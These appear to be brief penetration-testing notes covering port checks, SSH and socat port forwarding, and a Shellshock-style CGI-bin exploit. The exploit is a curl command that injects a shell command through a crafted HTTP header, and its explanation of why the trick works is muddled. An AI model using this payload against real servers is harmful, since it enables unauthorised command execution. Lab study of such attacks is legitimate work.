## Check open ports:

Linux:

>ss -tan

## SSH Dynamic Port Forwarding

To view services running on localhost w/ SSH tunnel:

>ssh -N -L <local port>:localhost:<localhost service port> username@ipaddress


## Exploiting CGI-bin

Requests to scripts on the CGI-bin can be exploited by adding the payload after the main request. 

>curl -v http://10.1.62.38/cgi-bin/<vuln script> -H "head:() { ignored; }; echo Content-Type: text/html; echo; <command>"

The new custom header adds enough space for the evil request. We need to specify the *Content-Type* to *text/html*, then we can echo our injected commands. 

## Local Port Forwarding 

socat:
Forwards requests to port 4444 to localhost:8080
> $ socat TCP4-LISTEN:4444,fork TCP4:127.0.0.1:8080
